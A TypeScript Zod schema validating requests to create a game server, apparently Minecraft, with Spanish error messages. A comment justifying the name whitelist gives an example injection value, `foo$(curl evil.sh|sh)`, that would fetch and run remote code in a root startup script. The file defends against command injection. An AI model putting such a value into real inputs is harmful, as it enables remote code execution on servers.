import { z } from 'zod';
import {
  DEFAULT_SERVER_DIFFICULTY,
  SERVER_DIFFICULTIES,
} from '../../domain/entities/server.entity';

export const createServerSchema = z.object({
  name: z
    .string({ error: 'name es requerido y debe ser texto' })
    .trim()
    .min(3, 'name debe tener al menos 3 caracteres')
    .max(50, 'name no puede exceder 50 caracteres')
    /**
     * El nombre se interpola en el script de User Data que corre como root en
     * la instancia. La lista blanca de caracteres evita que un nombre como
     * `foo$(curl evil.sh|sh)` termine ejecutandose ahi.
     */
    .regex(
      /^[a-zA-Z0-9 _-]+$/,
      'name solo admite letras, numeros, espacios, guiones y guiones bajos',
    ),

  difficulty: z
    .enum(SERVER_DIFFICULTIES, {
      error: `difficulty debe ser uno de: ${SERVER_DIFFICULTIES.join(', ')}`,
    })
    .default(DEFAULT_SERVER_DIFFICULTY),

  showCoordinates: z
    .boolean({ error: 'showCoordinates debe ser true o false' })
    .default(true),
  bonusChest: z
    .boolean({ error: 'bonusChest debe ser true o false' })
    .default(false),

  startingMap: z
    .boolean({ error: 'startingMap debe ser true o false' })
    .default(false),
});

export type TCreateServerDto = z.infer<typeof createServerSchema>;
